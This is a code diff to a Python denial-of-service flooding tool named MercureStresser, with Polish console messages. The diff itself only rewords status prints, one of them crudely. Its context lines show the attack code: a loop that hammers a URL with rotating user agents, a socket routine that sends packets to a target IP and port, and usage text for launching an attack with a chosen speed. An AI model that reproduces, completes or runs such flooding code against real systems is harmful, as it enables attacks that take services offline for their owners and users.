@@ -33,7 +33,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mMercureStresser • Laczenie...\033[0m")
+			print("\033[94mMercureStresser • Laczenie z serwerem\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92mMercureStresser • Atakowanie danego ip lub http\033[0m")
+				print ("\033[92m • Aktualnie napierdalasz w jakies ip\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -73,7 +73,7 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92mMercureStresser \n Wersja • 0.1 \n Autor: Mercure \nAlpha Able v0.1 \n
+	print (''' \033[92mMercureStresser \n Wersja • 0.1 \n • Autor: Mercure \n • Alpha Able v0.1 \n
 	MercureStresser • Uzyj: python3 stresser.py -s <IP> -p <port> -t <szybkość>
 	-h : • Pomoc •
 	-s : • IP  •
@@ -126,7 +126,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92mMercureStresser • Trwa atak na ",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mMercureStresser • Poczekaj...\033[0m")
+	print("\033[94mMercureStresser • Laczenie z serwerem trwa\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
